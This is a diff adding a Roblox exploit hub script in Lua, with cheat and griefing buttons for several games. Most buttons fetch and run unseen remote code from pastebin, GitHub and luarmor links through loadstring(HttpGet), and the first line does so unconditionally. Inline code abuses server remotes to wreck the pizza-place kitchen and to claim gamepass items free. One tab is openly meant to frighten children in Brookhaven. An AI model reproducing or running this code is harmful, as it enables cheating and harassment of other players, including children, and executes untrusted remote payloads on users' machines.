@@ -1,0 +1,121 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Guest028374/Notification-script-/refs/heads/main/just%20use%20it"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("COOL TROUBLE MAKER SECOND GUI", "BloodTheme")
+local Tab = Window:NewTab("Work at a pizza place")
+local Section = Tab:NewSection("SPOOKY SCARY SKELETONS")
+Section:NewButton("Destroy kitchen", "Makes the kitchen twerking xd", function()
+    _G.cookroomfucker = true -- change to false and re execute if you wanna turn it off 
+local lp = game:GetService("Players").LocalPlayer
+local remote
+local ffc = game.FindFirstChild
+ 
+do
+    local reg = (getreg or debug.getregistry)()
+ for i=1,#reg do
+  local f = reg[i]
+  if type(f)=="table" and rawget(f,"FireServer") and rawget(f,"BindEvents") then
+   remote = f
+  end
+ end
+end
+ 
+function moveThing(bmd, location)
+    remote:FireServer("UpdateProperty", bmd, "CFrame", location)
+    wait()
+    remote:FireServer("SquishDough", bmd)
+end
+ 
+-- cook room fucker main script
+ 
+for i,v in pairs(workspace.AllSupplyBoxes:GetChildren()) do
+    v.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
+end
+wait()
+ 
+ 
+spawn(function()
+    while _G.cookroomfucker and wait() do
+        spawn(function()
+            for i,v in pairs(workspace.AllDough:GetChildren()) do
+                moveThing(v, CFrame.new(Random.new():NextNumber(22.6,51.6),Random.new():NextNumber(3.6,14.6),Random.new():NextNumber(55.5,70.5)))
+            end
+        end)
+        spawn(function()
+            for i,v in pairs(workspace.AllMountainDew:GetChildren()) do
+                moveThing(v, CFrame.new(Random.new():NextNumber(22.6,51.6),Random.new():NextNumber(3.6,14.6),Random.new():NextNumber(55.5,70.5)))
+            end
+        end)
+        spawn(function()
+            for i,v in pairs(workspace.BoxingRoom:GetChildren()) do
+                moveThing(v, CFrame.new(Random.new():NextNumber(22.6,51.6),Random.new():NextNumber(3.6,14.6),Random.new():NextNumber(55.5,70.5)))
+            end
+        end)
+        spawn(function()
+            for i,v in pairs(workspace.AllBox:GetChildren()) do
+                moveThing(v, CFrame.new(Random.new():NextNumber(22.6,51.6),Random.new():NextNumber(3.6,14.6),Random.new():NextNumber(55.5,70.5)))
+            end
+        end)
+        spawn(function()
+            for i,v in pairs(workspace.AllSupplyBoxes:GetChildren()) do
+                moveThing(v, CFrame.new(Random.new():NextNumber(22.6,51.6),Random.new():NextNumber(3.6,14.6),Random.new():NextNumber(55.5,70.5)))
+            end
+        end)
+    end
+end)
+ 
+spawn(function()
+    while _G.cookroomfucker and wait() do
+        for i,v in pairs(game:GetService("Workspace").Ovens:GetChildren()) do
+            v.Door.ClickDetector.Detector:FireServer()
+            wait(.15)
+        end
+    end
+end)
+end)
+Section:NewButton("Auto farm", "how's vro is this lazy?", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/xQTtE6D9"))()
+end)
+Section:NewButton("Auto farm 2", "will replace soon", function()
+    loadstring(game:HttpGet('https://api.luarmor.net/files/v3/loaders/49f02b0d8c1f60207c84ae76e12abc1e.lua'))()
+end)
+Section:NewButton("Car destroyer", "kinda laggy", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/D1R6RxKi"))();
+end)
+Section:NewButton("Instant become manager", "mama boss", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/incognitototo/sda/main/dwa.lua", true))()
+end)
+local Tab = Window:NewTab("Dead rails")
+local Section = Tab:NewSection("YEEEHAWWW")
+Section:NewButton("Script 1", "dunno the name XP", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Dead-Rails-Alpha-OP-KiciaHook-V2-Dead-Rails-Auto-Farm-And-More-38614"))()
+end)
+Section:NewButton("Script 2", "instant kill are op", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
+end)
+Section:NewButton("Script 3", "Esp bla bla", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+end)
+local Tab = Window:NewTab("Grow a garden")
+local Section = Tab:NewSection("Grow a tree simulator X")
+Section:NewButton("Script 1", "auto sell or smt", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ameicaa1/Grow-a-Garden/main/Grow_A_Garden.lua"))()
+end)
+Section:NewButton("Script 2", "Same features but diff gui XD", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/GrowaGarden", true))()
+end)
+Section:NewButton("Script 3", "idk", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Skibidiking123/Fisch1/refs/heads/main/FischMain"))()
+end)
+local Tab = Window:NewTab("Obbies")
+local Section = Tab:NewSection("YIPPIE")
+Section:NewButton("Obby free gamepass", "IT STILL WORKS FINE AFTER YEARS", function()
+    for _,v in pairs(game:GetDescendants()) do if v.ClassName == "RemoteEvent" then if v.Parent.Name == "WeaponsRemotes" or v.Parent.Name == "VipRemotes" or v.Parent.Name == "Remotes" then v:FireServer() end end end
+end)
+Section:NewButton("Fake wallhop", "LOL SKILL ISSUES", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScpGuest666/Random-Roblox-script/refs/heads/main/Roblox%20WallHop%20V4%20script"))()
+end)
+local Tab = Window:NewTab("MAKE KIDS CRIES IN BROOKHEAVEM SIMULATOR")
+local Section = Tab:NewSection("MUHEHEHE")
+Section:NewButton("Brookheaven audio jumpscared", "OO they gonna cry", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ameicaa0/brookhaven/refs/heads/main/brookhaven%20script.txt"))()
+end)
